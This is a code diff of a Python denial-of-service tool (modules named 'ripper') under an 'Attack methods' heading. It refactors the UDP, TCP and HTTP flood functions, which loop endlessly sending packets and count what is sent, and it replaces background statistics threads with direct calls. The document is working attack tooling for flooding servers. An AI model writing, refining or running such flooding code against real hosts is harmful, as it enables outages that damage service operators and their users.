@@ -1,20 +1,16 @@
 import socket
-import threading
-import time
 import random
 import urllib.request
 from os import urandom as randbytes
 from ripper.context import Context
 from ripper.statistics import show_statistics
 from ripper.common import get_random_string, get_server_ip_error_msg
-import ripper.services
 
 
 ###############################################
 # Attack methods
 ###############################################
 def down_it_udp(_ctx: Context):
-    i = 1
     while True:
         sock = _ctx.sock_manager.get_udp_socket()
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
@@ -36,18 +32,8 @@ def down_it_udp(_ctx: Context):
                 _ctx.errors.remove(str(get_server_ip_error_msg))
             _ctx.packets_sent += 1
 
-        if _ctx.port:
-            i += 1
-            if i == 50:
-                i = 1
-                thread = threading.Thread(target=ripper.services.connect_host, args=[_ctx])
-                thread.daemon = True
-                thread.start()
-
         if not _ctx.show_statistics:
-            thread = threading.Thread(target=show_statistics, args=[_ctx])
-            thread.daemon = True
-            thread.start()
+            show_statistics(_ctx)
 
 
 def down_it_http(_ctx: Context):
@@ -71,7 +57,6 @@ def down_it_http(_ctx: Context):
 
         _ctx.packets_sent += 1
         show_statistics(_ctx)
-        # time.sleep(.01)
 
 
 def down_it_tcp(_ctx: Context):
@@ -92,12 +77,8 @@ def down_it_tcp(_ctx: Context):
                 else:
                     _ctx.packets_sent += bytes_to_send_len
                     if not _ctx.show_statistics:
-                        thread = threading.Thread(target=show_statistics, args=[_ctx])
-                        thread.daemon = True
-                        thread.start()
+                        show_statistics(_ctx)
         except:
             _ctx.connections_failed += 1
             if not _ctx.show_statistics:
-                thread = threading.Thread(target=show_statistics, args=[_ctx])
-                thread.daemon = True
-                thread.start()
+                show_statistics(_ctx)
